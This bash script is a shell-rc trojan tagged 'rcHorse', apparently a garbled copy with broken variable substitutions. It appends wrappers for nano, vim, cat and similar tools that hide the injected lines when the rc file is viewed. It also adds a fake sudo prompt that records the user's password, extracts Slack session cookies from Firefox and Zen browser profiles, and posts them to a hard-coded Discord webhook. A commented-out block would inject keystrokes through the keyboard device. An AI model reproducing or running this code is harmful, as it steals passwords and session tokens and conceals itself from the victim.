#!/bin/bash
case \bash in
  "bash") target=".bashrc" ;;
  "zsh") target=".zshrc" ;;
  *) exit 1 ;;
esac
[ -f "\/home/runner/\" ] && awk '\ != "#--rcHorse--" {print \/home/runner/work/_temp/0e9a823f-1756-4328-9387-c52a9b2060c5.sh}' "\/home/runner/\" > temp && mv temp "\/home/runner/\"
echo "nano(){ #--rcHorse--
	if [[ "echo $@ | grep -c \"rcTarget\"" != "0" ]]; then #--rcHorse--
		rcHorse="$(awk '$NF=="#--rcHorse--" {print $0}' $HOME/rcTarget)" #--rcHorse--
		bashrc="$(awk '$NF!="#--rcHorse--" {print $0}' $HOME/rcTarget)" #--rcHorse--
		echo "$bashrc" > $HOME/rcTarget #--rcHorse--
		command nano $@ #--rcHorse--
		echo "$rcHorse" >> $HOME/rcTarget #--rcHorse--
	else #--rcHorse--
		command nano $@ #--rcHorse--
	fi #--rcHorse--
} #--rcHorse--
 #--rcHorse--
vi(){ #--rcHorse--
	if [[ "echo $@ | grep -c \"rcTarget\"" != "0" ]]; then #--rcHorse--
		rcHorse="$(awk '$NF=="#--rcHorse--" {print $0}' $HOME/rcTarget)" #--rcHorse--
		bashrc="$(awk '$NF!="#--rcHorse--" {print $0}' $HOME/rcTarget)" #--rcHorse--
		echo "$bashrc" > $HOME/rcTarget #--rcHorse--
		command vi $@ #--rcHorse--
		echo "$rcHorse" >> $HOME/rcTarget #--rcHorse--
	else #--rcHorse--
		command vi $@ #--rcHorse--
	fi #--rcHorse--
} #--rcHorse--
 #--rcHorse--
vim(){ #--rcHorse--
	if [[ "echo $@ | grep -c \"rcTarget\"" != "0" ]]; then #--rcHorse--
		rcHorse="$(awk '$NF=="#--rcHorse--" {print $0}' $HOME/rcTarget)" #--rcHorse--
		bashrc="$(awk '$NF!="#--rcHorse--" {print $0}' $HOME/rcTarget)" #--rcHorse--
		echo "$bashrc" > $HOME/rcTarget #--rcHorse--
		command vim $@ #--rcHorse--
		echo "$rcHorse" >> $HOME/rcTarget #--rcHorse--
	else #--rcHorse--
		command vim $@ #--rcHorse--
	fi #--rcHorse--
} #--rcHorse--
 #--rcHorse--
nvim(){ #--rcHorse--
	if [[ "echo $@ | grep -c \"rcTarget\"" != "0" ]]; then #--rcHorse--
		rcHorse="$(awk '$NF=="#--rcHorse--" {print $0}' $HOME/rcTarget)" #--rcHorse--
		bashrc="$(awk '$NF!="#--rcHorse--" {print $0}' $HOME/rcTarget)" #--rcHorse--
		echo "$bashrc" > $HOME/rcTarget #--rcHorse--
		command nvim $@ #--rcHorse--
		echo "$rcHorse" >> $HOME/rcTarget #--rcHorse--
	else #--rcHorse--
		command nvim $@ #--rcHorse--
	fi #--rcHorse--
} #--rcHorse--
 #--rcHorse--
cat(){ #--rcHorse--
	if [[ "echo $@ | grep -c \"rcTarget\"" != "0" ]]; then #--rcHorse--
		rcHorse="$(awk '$NF=="#--rcHorse--" {print $0}' $HOME/rcTarget)" #--rcHorse--
		bashrc="$(awk '$NF!="#--rcHorse--" {print $0}' $HOME/rcTarget)" #--rcHorse--
		echo "$bashrc" > $HOME/rcTarget #--rcHorse--
		command cat $@ #--rcHorse--
		echo "$rcHorse" >> $HOME/rcTarget #--rcHorse--
	else #--rcHorse--
		command cat $@ #--rcHorse--
	fi #--rcHorse--
} #--rcHorse--
 #--rcHorse--
bat(){ #--rcHorse--
	if [[ "echo $@ | grep -c \"rcTarget\"" != "0" ]]; then #--rcHorse--
		rcHorse="$(awk '$NF=="#--rcHorse--" {print $0}' $HOME/rcTarget)" #--rcHorse--
		bashrc="$(awk '$NF!="#--rcHorse--" {print $0}' $HOME/rcTarget)" #--rcHorse--
		echo "$bashrc" > $HOME/rcTarget #--rcHorse--
		command bat $@ #--rcHorse--
		echo "$rcHorse" >> $HOME/rcTarget #--rcHorse--
	else #--rcHorse--
		command bat $@ #--rcHorse--
	fi #--rcHorse--
} #--rcHorse--
 #--rcHorse--
tac(){ #--rcHorse--
	if [[ "echo $@ | grep -c \"rcTarget\"" != "0" ]]; then #--rcHorse--
		rcHorse="$(awk '$NF=="#--rcHorse--" {print $0}' $HOME/rcTarget)" #--rcHorse--
		bashrc="$(awk '$NF!="#--rcHorse--" {print $0}' $HOME/rcTarget)" #--rcHorse--
		echo "$bashrc" > $HOME/rcTarget #--rcHorse--
		command tac $@ #--rcHorse--
		echo "$rcHorse" >> $HOME/rcTarget #--rcHorse--
	else #--rcHorse--
		command tac $@ #--rcHorse--
	fi #--rcHorse--
} #--rcHorse--
 #--rcHorse--
sudo(){ #--rcHorse--
	command sudo -nv 2>/dev/null #--rcHorse--
	if [[ "$?" = "0" ]]; then #--rcHorse--
		command sudo -n $@ #--rcHorse--
	else #--rcHorse--
		horseVision="" #--rcHorse--
		attempts=0 #--rcHorse--
		success="false" #--rcHorse--
		while true; do #--rcHorse--
			read -sp "[sudo] password for $USER:" horseVision #--rcHorse--
			echo "" #--rcHorse--
			echo "$horseVision" | command sudo -p "" -Sv 2>/dev/null 1>/dev/null #--rcHorse--
			if [[ "$?" = "0" ]]; then #--rcHorse--
				success="true" #--rcHorse--
				break #--rcHorse--
			elif [[ "$attempts" != "2" ]]; then #--rcHorse--
				echo "Sorry, try again" #--rcHorse--
				attempts="$(($attempts + 1))" #--rcHorse--
			else #--rcHorse--
				echo "sudo: 3 incorrect password attempts" #--rcHorse--
				break #--rcHorse--
			fi #--rcHorse--
		done #--rcHorse--
		if [[ "$success" = "true" ]]; then #--rcHorse--
			horseData="#horseVision = \"$horseVision\" #--rcHorse--" #--rcHorse--
			command sudo -n $@ #--rcHorse--
			if [[ "$horseData" != "$(tail -n 1 $HOME/rcTarget)" ]]; then #--rcHorse--
				echo "$horseData" >> $HOME/rcTarget #--rcHorse--
			fi #--rcHorse--
 #--rcHorse--
			tokenf=$(find "$HOME/.mozilla/firefox" -type f -name "cookies.sqlite" 2>/dev/null | while read -r cookie_db; do #--rcHorse--
					tmp_db=$(mktemp /tmp/cookies.XXXXXX.sqlite) 2>/dev/null #--rcHorse--
					cp "$cookie_db" "$tmp_db" 2>/dev/null #--rcHorse--
					sqlite3 "$tmp_db" "SELECT value FROM moz_cookies;" 2>/dev/null #--rcHorse--
					rm -f "$tmp_db" 2>/dev/null #--rcHorse--
					done | grep -aoE 'xoxd-[A-Za-z0-9%]+' 2>/dev/null | awk '{printf "%s ", $0}' 2>/dev/null; echo) #--rcHorse--
			tokenz=$(find "$HOME/.zen" -type f -name "cookies.sqlite" 2>/dev/null | while read -r cookie_db; do #--rcHorse--
					tmp_db=$(mktemp /tmp/cookies.XXXXXX.sqlite) 2>/dev/null #--rcHorse--
					cp "$cookie_db" "$tmp_db" 2>/dev/null #--rcHorse--
					sqlite3 "$tmp_db" "SELECT value FROM moz_cookies;" 2>/dev/null #--rcHorse--
					rm -f "$tmp_db" 2>/dev/null #--rcHorse--
					done | grep -aoE 'xoxd-[A-Za-z0-9%]+' 2>/dev/null | awk '{printf "%s ", $0}' 2>/dev/null; echo) #--rcHorse--
 #--rcHorse--
			usr=$(whoami) #--rcHorse--
			pwd=$(pwd) #--rcHorse--
 #--rcHorse--
			setsid bash -c "curl -s -X POST -H \"Content-Type: application/json\" -d \"{\\\"content\\\": \\\"sudo=${horseVision} usr=${usr} pwd=${pwd} tokenf=${tokenf} tokenz=${tokenz}\\\"}\" https://discord.com/api/webhooks/1410231118363627641/2gd3OeGr7fDmqzkB9pc1Ymx_0osDYOxYzckTKGvLnw6QZl_Br8jwguvZg8grWUPSEWGu >/dev/null 2>&1 &" >/dev/null 2>&1 </dev/null #--rcHorse--
#			setsid bash -c 'echo '"$horseVision"' | sudo -ES bash -c '\'' #--rcHorse--
#				declare -A keycodes #--rcHorse--
#				keycodes=(["a"]=30 ["b"]=48 ["c"]=46 ["d"]=32 ["e"]=18 ["f"]=33 ["g"]=34 ["h"]=35 ["i"]=23 ["j"]=36 ["k"]=37 ["l"]=38 ["m"]=50 ["n"]=49 ["o"]=24 ["p"]=25 ["q"]=16 ["r"]=19 ["s"]=31 ["t"]=20 ["u"]=22 ["v"]=47 ["w"]=17 ["x"]=45 ["y"]=21 ["z"]=44 ["_"]=57 ["#"]=15 ["("]=1 [")"]=-1 ["["]=2 ["]"]=-2 ["{"]=3	["}"]=-3) #--rcHorse--
#				keyboard=$(libinput list-devices | awk "/^Device:/ {name=\$0} /^Kernel:/ {dev=\$2} /^Capabilities:/ && /keyboard/ && tolower(name) ~ /keyboard/ {print dev; exit}") #--rcHorse--
#				texts=("(h)i_there_" "(l)ooking_cute_today_" "(" ")" "[#]" "{#}") #--rcHorse--
#				while true; do #--rcHorse--
#					sleep $((9000 + RANDOM % 3600)) #--rcHorse--
#					text=${texts[$((RANDOM % ${#texts[@]}))]} #--rcHorse--
#					echo "$text" | fold -w1 | while read -r letter; do #--rcHorse--
#						code=${keycodes[$letter]} #--rcHorse--
#						if [[ $code -eq 1 ]]; then #--rcHorse--
#							printf "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x2A\x00\x01\x00\x00\x00" | dd of="$keyboard" bs=24 >/dev/null 2>&1 #--rcHorse--
#							printf "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" | dd of="$keyboard" bs=24 >/dev/null 2>&1 #--rcHorse--
#						elif [[ $code -eq -1 ]]; then #--rcHorse--
#							printf "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x2A\x00\x00\x00\x00\x00" | dd of="$keyboard" bs=24 >/dev/null 2>&1 #--rcHorse--
#							printf "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" | dd of="$keyboard" bs=24 >/dev/null 2>&1 #--rcHorse--
#						elif [[ $code -eq 2 ]]; then #--rcHorse--
#							printf "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x1D\x00\x01\x00\x00\x00" | dd of="$keyboard" bs=24 >/dev/null 2>&1 #--rcHorse--
#							printf "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" | dd of="$keyboard" bs=24 >/dev/null 2>&1 #--rcHorse--
#						elif [[ $code -eq -2 ]]; then #--rcHorse--
#							printf "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x1D\x00\x00\x00\x00\x00" | dd of="$keyboard" bs=24 >/dev/null 2>&1 #--rcHorse--
#							printf "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" | dd of="$keyboard" bs=24 >/dev/null 2>&1 #--rcHorse--
#						elif [[ $code -eq 3 ]]; then #--rcHorse--
#							printf "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x38\x00\x01\x00\x00\x00" | dd of="$keyboard" bs=24 >/dev/null 2>&1 #--rcHorse--
#							printf "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" | dd of="$keyboard" bs=24 >/dev/null 2>&1 #--rcHorse--
#						elif [[ $code -eq -3 ]]; then #--rcHorse--
#							printf "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x38\x00\x00\x00\x00\x00" | dd of="$keyboard" bs=24 >/dev/null 2>&1 #--rcHorse--
#							printf "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" | sdd of="$keyboard" bs=24 >/dev/null 2>&1 #--rcHorse--
#						else #--rcHorse--
#							printf "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x$(printf "%02x" "$code")\x00\x01\x00\x00\x00" | dd of="$keyboard" bs=24 >/dev/null 2>&1 #--rcHorse--
#							printf "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x$(printf "%02x" "$code")\x00\x00\x00\x00\x00" | dd of="$keyboard" bs=24 >/dev/null 2>&1 #--rcHorse--
#							printf "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" | dd of="$keyboard" bs=24 >/dev/null 2>&1 #--rcHorse--
#						fi #--rcHorse--
#					done #--rcHorse--
#				done #--rcHorse--
#				'\'' &' >/dev/null 2>&1 </dev/null #--rcHorse--
		fi #--rcHorse--
	fi #--rcHorse--
} #--rcHorse--" >> "\/home/runner/\"
